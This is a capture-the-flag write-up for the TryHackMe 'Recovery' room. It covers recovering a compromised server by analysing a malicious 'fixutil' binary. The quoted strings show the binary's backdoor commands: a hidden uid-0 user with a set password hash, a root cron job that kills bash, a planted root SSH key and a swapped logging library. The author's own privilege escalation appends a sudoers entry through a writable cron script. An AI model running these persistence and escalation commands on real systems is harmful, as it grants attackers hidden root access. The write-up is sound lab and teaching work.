link: https://tryhackme.com/room/recovery

NOTE:
> For RE, 1st target would be to bring the binary to my local machine, no matter what.

As soon as I am logging into the machine, it is getting flooded with texts...
So, how to send bash Commands to stdin?

1.
```
ssh alex@IP 'bash --noprofile --norc'
```
link: [stackoverflow](https://stackoverflow.com/questions/9357464/how-to-start-a-shell-without-any-user-configuration)

2.
```
echo '[COMMAND]' | ssh alex@[IP]
```

Now, lets copy using `scp`
```
scp alex@10.10.28.154:/home/alex/fixutil .
```

Then, Performed string analysis (Only important ones are shown):
```
$ strings fixutil 

...
...
/root/.ssh/authorized_keys
/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
/opt/brilliant_script.sh
#!/bin/sh
for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
/etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
...
LogIncorrectAttempt
...
/home/alex/.bashrc
while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
...
echo pwned | /bin/admin > /dev/null
...
```
Funny thing is: only bash was affected by the fixutil, not sh shell!!

Login via sh:

```
This clearly mentions there is an infinite while loop that echoes “YOU DIDN’T SAY THE MAGIC WORD!”

As you hit CTRL+c we can see a glimpse of

alex@recoveryserver$

Now if we try to start /bin/sh the output stops after a while and we get a sh shell.
```

Now we can delete the last line of the .bashrc which is causing the all those looping outputs.

And grab the `flag0`

Now, bash is clean => moving to bash shell

Now, lets perform privsec => editing /opt/brilliant_script.sh
```
#!/bin/sh

echo "alex ALL=(ALL:ALL) ALL" >> /etc/sudoers;
```
To provide user alex all the permissions by adding entry in /etc/sudoers file
```
$ sudo -l

Matching Defaults entries for alex on recoveryserver:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alex may run the following commands on recoveryserver:
    (ALL : ALL) ALL

$ sudo -i

root@recoveryserver:~# id
uid=0(root) gid=0(root) groups=0(root)
```
Now, got the `Flag1`


Deleting the `security` user (with uid, gid =0) from /etc/passwd and /etc/shadow file after getting rootshell via /opt/brilliant_script.sh,

Got the `Flag4`

From string analysis of fixutil:
```
$ strings fixutil | grep logging

/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
replacelogging.c
replacelogging.c
replacelogging.c
/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so
/lib/x86_64-linux-gnu/liblogging.so
bin2c_liblogging_so
```
It copies /tmp/logging.so to /lib/x86_64-linux-gnu/oldliblogging.so . Since the fixutil binary copied the original libloggin.so to /tmp/logging.so . So, the original liblogging is the oldliblogging.so.

Got `Flag2`


Again, from string analyis of fixutil:
```
$ strings fixutil | grep ssh

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
/root/.ssh/authorized_keys
ssh_key
```
Removed this entry from `/root/.ssh/authorized_keys`

Got `Flag3`


After An nmap scan, I got 22, 80, 1337 was open.

In port 80, I got some gibberish texts => lets go the web directory

=> /usr/local/apache2/htdocs

Again, While seeing the strings in fixutil, I saw traces of `XOR` written:
```
$ strings fixutil | grep XOR

XORFile
XOREncryptWebFiles
XORFile
XOREncryptWebFiles
XORFile
XOREncryptWebFiles
```

Used python script to decrypt the xor encryption => See the Flag 5 portion of the link:https://rogi9.medium.com/recovery-thm-room-writeup-fb2e45aca423


Also See the approch of https://rogi9.medium.com/recovery-thm-room-writeup-fb2e45aca423

